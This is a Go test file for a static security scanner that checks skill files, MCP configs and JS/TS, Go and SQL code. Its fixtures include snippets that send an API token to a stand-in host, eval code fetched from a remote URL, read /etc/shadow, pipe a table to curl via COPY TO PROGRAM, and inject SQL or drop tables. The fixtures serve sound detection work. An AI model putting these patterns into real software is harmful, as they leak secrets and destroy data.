package scout_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/scantest"
	scenario "github.com/skarm/scout/internal/scantest/scenarios"
	"github.com/skarm/scout/internal/syntax/frontend"
	"github.com/skarm/scout/internal/syntax/scriptsyntax"
	"github.com/skarm/scout/report"
)

func TestYAMLFrontmatterAndCodexTOML(t *testing.T) {
	c := scenario.ParserConfig(t)
	if !frontend.BackendFor("yaml").Available {
		t.Skip("Go YAML parser not linked")
	}
	c.Scanner.Checks.YAML = true
	c.Scanner.Checks.Patterns = true
	s, e := scantest.New(c, t)
	if e != nil {
		t.Fatal(e)
	}
	r, e := s.ScanBytes(context.Background(), "SKILL.md", []byte("---\nname: sample\ndescription: >-\n  Format source code\nallowed-tools: Read\n---\n# Sample\nFormat code only.\n"))
	if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
		t.Fatal(e)
	}
	if len(r.Metadata.Files) == 0 {
		t.Fatalf("missing metadata: %+v", r.Diagnostics)
	}
	found := false
	for _, f := range r.Metadata.Files {
		if f.Format == "yaml" && len(f.Fields) >= 3 {
			found = true
		}
	}
	if !found {
		t.Fatalf("metadata: %+v", r.Metadata)
	}
	r, e = s.ScanBytes(context.Background(), "config.toml", []byte("[mcp_servers.remote]\nurl='http://example.invalid/mcp'\n"))
	if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
		t.Fatal(e)
	}
	found = false
	for _, f := range r.Findings {
		if f.RuleID == "MC001" {
			found = true
		}
	}
	if !found {
		t.Fatalf("TOML MCP rule missing: %+v", r.Coverage)
	}
}

func TestPythonTOMLDependencyDeclarations(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Python = false
	s, err := scantest.New(c, t)
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, src string
		want      int
	}{
		{
			name: "pyproject.toml",
			src:  "[project]\ndependencies=['requests==2.32.3', 'other>=2']\n[project.optional-dependencies]\ntest=['pytest==8.0.0']\n[build-system]\nrequires=['setuptools>=60']\n",
			want: 4,
		},
		{
			name: "poetry.lock",
			src:  "[[package]]\nname='requests'\nversion='2.32.3'\n[[package]]\nname='sample'\nversion='1.0.0'\n",
			want: 2,
		},
		{
			name: "uv.lock",
			src:  "version=1\n[[package]]\nname='requests'\nversion='2.32.3'\nsource={registry='https://pypi.org/simple'}\n",
			want: 1,
		},
		{name: "Pipfile", src: "[packages]\nrequests='==2.32.3'\n[dev-packages]\npytest='*'\n", want: 2},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), tc.name, []byte(tc.src))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if len(r.Dependencies.Declarations) != tc.want {
				t.Fatalf("%+v", r.Dependencies)
			}
			ids := map[string]bool{}
			for _, d := range r.Dependencies.Declarations {
				if ids[d.ID] {
					t.Fatal("duplicate declaration ID")
				}
				ids[d.ID] = true
				if d.Source.ByteStart != 0 || d.Source.ByteEnd != len(tc.src) {
					t.Fatal("TOML fabricated scalar position")
				}
			}
		})
	}
}

func TestEmbeddedCodeCoverage(t *testing.T) {
	for _, text := range []string{
		"```python\nprint('hello')\n```",
		"```text\nopaque instructions\n```",
		"```go\npackage p\n```",
		"> ```sh\n> echo hi\n> ```",
		"---\nname: simple\ndescription: test\n---\nBody",
	} {
		root := t.TempDir()
		scenario.WriteFile(t, root, "SKILL.md", text)
		r, scanErr33 := scenario.Scan(t, root)
		if scanErr33 != nil && !errors.Is(scanErr33, scantest.ErrIncomplete) {
			t.Fatal(scanErr33)
		}
		if errors.Is(scanErr33, scantest.ErrIncomplete) && r.Run.State == "complete" {
			t.Fatal("incomplete error with a complete run")
		}

		wantCoverage := "partial"
		if strings.Contains(text, "```go") {
			wantCoverage = "complete"
		}
		if string(r.Coverage.Completeness) != wantCoverage || r.Evaluation.Decision == "allow" {
			t.Fatalf("embedded/metadata coverage bypass: input=%q coverage=%s evaluation=%+v", text, r.Coverage.Completeness, r.Evaluation)
		}
	}
}

func TestProductionLanguagesThroughPublicScanner(t *testing.T) {
	opts := scout.DefaultOptions()
	opts.Profile = scout.Custom
	opts.Checks = &scout.Checks{}
	s, err := scout.New(context.Background(), opts)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = s.Close() })
	for _, tc := range []struct {
		name, file, code, rule string
		want                   bool
	}{
		{
			name: "js-import-alias",
			file: "tool.mjs",
			code: `import {exec as run} from 'node:child_process'; run(process.argv[2]);`,
			rule: "JS001",
			want: true,
		},
		{
			name: "js-argv",
			file: "tool.cjs",
			code: `const cp = require('child_process'); cp.execFile('echo', ['fixed']);`,
			rule: "JS001",
			want: false,
		},
		{
			name: "js-options-shell",
			file: "tool.js",
			code: `const {spawn} = require('child_process'); spawn('echo', [input], {shell:true});`,
			rule: "JS001",
			want: true,
		},
		{
			name: "js-module-shadow",
			file: "tool.js",
			code: `import cp from 'child_process'; function f(cp) { cp.exec(input); }`,
			rule: "JS001",
			want: false,
		},
		{
			name: "ts-import-cast",
			file: "tool.ts",
			code: `const cp = require('child_process') as typeof import('child_process'); cp.exec(input);`,
			rule: "JS001",
			want: true,
		},
		{
			name: "js-comment",
			file: "tool.js",
			code: `// require('child_process').exec(input)\nconst text = "eval(input)";`,
			rule: "JS001",
			want: false,
		},
		{
			name: "ts-credential-flow",
			file: "tool.ts",
			code: `const token: string = process.env.API_TOKEN; const body = JSON.stringify({token}); fetch('https://x.invalid', {method:'POST', body});`,
			rule: "JS003",
			want: true,
		},
		{
			name: "ts-overwrite",
			file: "tool.ts",
			code: `let token = process.env.API_TOKEN; token = 'public'; fetch('https://x.invalid', {body:token});`,
			rule: "JS003",
			want: false,
		},
		{
			name: "js-env-destructure",
			file: "tool.js",
			code: `const {API_TOKEN} = process.env; fetch('https://x.invalid', {body:API_TOKEN});`,
			rule: "JS003",
			want: true,
		},
		{
			name: "js-branch-flow",
			file: "tool.js",
			code: `let token='public'; if (condition) { token = process.env.API_TOKEN; } fetch('https://x.invalid', {body:token});`,
			rule: "JS003",
			want: true,
		},
		{
			name: "js-both-branches-clear",
			file: "tool.js",
			code: `let token=process.env.API_TOKEN; if (condition) { token = 'one'; } else { token = 'two'; } fetch('https://x.invalid', {body:token});`,
			rule: "JS003",
			want: false,
		},
		{
			name: "js-local-shadow",
			file: "tool.js",
			code: `const token='public'; { const token=process.env.API_TOKEN; } fetch('https://x.invalid', {body:token});`,
			rule: "JS003",
			want: false,
		},
		{
			name: "ts-sql-interpolation",
			file: "tool.ts",
			code: "const sql = `SELECT * FROM users WHERE id = '${req.query.id}'`; db.query(sql);",
			rule: "JS004",
			want: true,
		},
		{
			name: "ts-sql-parameters",
			file: "tool.ts",
			code: `db.query('SELECT * FROM users WHERE id = $1', [req.query.id]);`,
			rule: "JS004",
			want: false,
		},
		{
			name: "js-sensitive-read",
			file: "tool.js",
			code: `import {readFileSync as read} from 'node:fs'; read('/etc/shadow');`,
			rule: "JS005",
			want: true,
		},
		{
			name: "js-public-read",
			file: "tool.js",
			code: `import {readFileSync as read} from 'node:fs'; read('public.json');`,
			rule: "JS005",
			want: false,
		},
		{name: "js-eval", file: "tool.js", code: `const value = eval(process.argv[2]);`, rule: "JS002", want: true},
		{
			name: "js-shadow-eval",
			file: "tool.js",
			code: `function f(eval) { eval('fixed'); }`,
			rule: "JS002",
			want: false,
		},
		{name: "js-numeric-timer", file: "tool.js", code: `setTimeout(1000);`, rule: "JS002", want: false},
		{name: "js-numeric-eval", file: "tool.js", code: `eval(1000);`, rule: "JS002", want: false},
		{
			name: "js-eval-promise",
			file: "tool.js",
			code: `eval(fetch('https://x.invalid/payload.js'));`,
			rule: "JS002",
			want: false,
		},
		{
			name: "js-eval-response",
			file: "tool.js",
			code: `eval(await fetch('https://x.invalid/payload.js'));`,
			rule: "JS002",
			want: false,
		},
		{
			name: "js-eval-text",
			file: "tool.js",
			code: `eval(await (await fetch('https://x.invalid/payload.js')).text());`,
			rule: "JS002",
			want: true,
		},
		{
			name: "js-escaped-module",
			file: "tool.js",
			code: `const cp=require('\x63hild_process'); cp.exec(input);`,
			rule: "JS001",
			want: true,
		},
		{
			name: "tsx",
			file: "tool.tsx",
			code: `import React from 'react'; const widget = <div>{eval(input)}</div>;`,
			rule: "JS002",
			want: true,
		},
		{
			name: "go-sql",
			file: "tool.go",
			code: `package p; import "fmt"; func f(db *DB, name string){ q:=fmt.Sprintf("SELECT * FROM users WHERE name='%s'",name); db.Query(q) }`,
			rule: "GO005",
			want: true,
		},
		{
			name: "go-sql-parameters",
			file: "tool.go",
			code: `package p; func f(db *DB, name string){ db.Query("SELECT * FROM users WHERE name=$1", name) }`,
			rule: "GO005",
			want: false,
		},
		{
			name: "go-query-concatenation",
			file: "tool.go",
			code: `package p; func f(db *DB, name string){ q:="SELECT * FROM users WHERE name='"; q=q+name;db.QueryContext(ctx,q) }`,
			rule: "GO005",
			want: true,
		},
		{
			name: "go-query-overwrite",
			file: "tool.go",
			code: `package p; func f(db *DB, name string){ q:="SELECT * FROM users WHERE name='"+name; q="SELECT 1";db.Query(q) }`,
			rule: "GO005",
			want: false,
		},
		{
			name: "go-uncalled-closure",
			file: "tool.go",
			code: `package p; func f(db *DB, name string){ q:="SELECT 1"; _=func(){ q="SELECT * FROM users WHERE name='"+name };db.Query(q) }`,
			rule: "GO005",
			want: false,
		},
		{
			name: "go-tls",
			file: "tool.go",
			code: `package p; import "crypto/tls"; var c = &tls.Config{InsecureSkipVerify:true}`,
			rule: "GO006",
			want: true,
		},
		{
			name: "go-tls-verified",
			file: "tool.go",
			code: `package p; import "crypto/tls"; var c = &tls.Config{MinVersion:tls.VersionTLS13}`,
			rule: "GO006",
			want: false,
		},
		{name: "sql-truncate", file: "report.sql", code: `TRUNCATE private_orders CASCADE;`, rule: "SQL001", want: true},
		{
			name: "sql-read-only",
			file: "report.sql",
			code: `SELECT count(*) FROM public_totals;`,
			rule: "SQL001",
			want: false,
		},
		{
			name: "sql-comment-string",
			file: "report.sql",
			code: "-- DROP TABLE orders;\nSELECT 'TRUNCATE orders;';",
			rule: "SQL001",
			want: false,
		},
		{
			name: "sql-copy-program",
			file: "export.sql",
			code: `COPY (SELECT * FROM private_orders) TO PROGRAM 'curl https://x.invalid';`,
			rule: "SQL003",
			want: true,
		},
		{
			name: "sql-copy-stream",
			file: "export.sql",
			code: `COPY (SELECT * FROM public_totals) TO STDOUT;`,
			rule: "SQL003",
			want: false,
		},
		{
			name: "sql-export-column",
			file: "export.sql",
			code: `SELECT outfile FROM public_totals;`,
			rule: "SQL003",
			want: false,
		},
		{
			name: "sql-file-function",
			file: "export.sql",
			code: `SELECT pg_read_file('/etc/shadow');`,
			rule: "SQL003",
			want: true,
		},
		{
			name: "sql-superuser",
			file: "roles.sql",
			code: `ALTER ROLE reporter WITH SUPERUSER BYPASSRLS;`,
			rule: "SQL002",
			want: true,
		},
		{
			name: "sql-restricted-role",
			file: "roles.sql",
			code: `CREATE ROLE reporter NOSUPERUSER NOBYPASSRLS;`,
			rule: "SQL002",
			want: false,
		},
		{name: "sql-disable-limit", file: "budget.sql", code: `SET statement_timeout = 0;`, rule: "SQL004", want: true},
		{name: "sql-bounded", file: "budget.sql", code: `SET statement_timeout = 1000;`, rule: "SQL004", want: false},
		{
			name: "js-tls",
			file: "client.js",
			code: `const options = {rejectUnauthorized:false};`,
			rule: "JS006",
			want: true,
		},
		{
			name: "js-tls-comment",
			file: "client.js",
			code: `const text = "rejectUnauthorized:false";`,
			rule: "JS006",
			want: false,
		},
		{
			name: "fenced-sql",
			file: "SKILL.md",
			code: "```sql\nDROP TABLE private_orders;\n```\n",
			rule: "SQL001",
			want: true,
		},
		{
			name: "fenced-ts",
			file: "SKILL.md",
			code: "```ts\nimport {exec} from 'child_process'; exec(input);\n```\n",
			rule: "JS001",
			want: true,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if strings.HasPrefix(tc.rule, "JS") && !scriptsyntax.Available() {
				t.Skip("native JS/TS backend is not linked in the reduced build")
			}
			run, err := s.Scan(context.Background(), scout.Reader(tc.file, strings.NewReader(tc.code)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 {
				t.Fatalf("missing target: %+v", run)
			}
			found := false
			for _, f := range run.Targets[0].Analysis.Findings {
				if f.RuleID != tc.rule {
					continue
				}
				found = true
				if f.Location.ByteStart < 0 || f.Location.ByteEnd <= f.Location.ByteStart || f.Location.ByteEnd > len(tc.code) || f.Evidence.SpanSHA256 == "" || f.Severity.Rank() < report.Medium.Rank() {
					t.Fatalf("invalid evidence: %+v", f)
				}
			}
			if found != tc.want {
				t.Fatalf("%s found=%v want=%v; findings=%+v", tc.rule, found, tc.want, run.Targets[0].Analysis.Findings)
			}
		})
	}
}

func TestLanguageFailuresCannotAuthorizeAnInput(t *testing.T) {
	opts := scout.DefaultOptions()
	opts.Profile = scout.Custom
	opts.Checks = &scout.Checks{}
	s, err := scout.New(context.Background(), opts)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = s.Close() })
	for _, tc := range []struct{ name, code string }{
		{name: "broken.js", code: `const payload = (`},
		{name: "broken.ts", code: `function invalid( : number {`},
		{name: "broken.sql", code: `SELECT 'unclosed`},
		{name: "body.sql", code: `DO $$ BEGIN EXECUTE incoming; END $$;`},
	} {
		run, err := s.Scan(context.Background(), scout.Reader(tc.name, strings.NewReader(tc.code)))
		if !errors.Is(err, scout.ErrIncomplete) || run.State == report.RunComplete || run.Targets[0].Analysis.Coverage.Completeness == report.Complete {
			t.Fatalf("unfinished %s allowed as complete: %+v %v", tc.name, run, err)
		}
	}
}
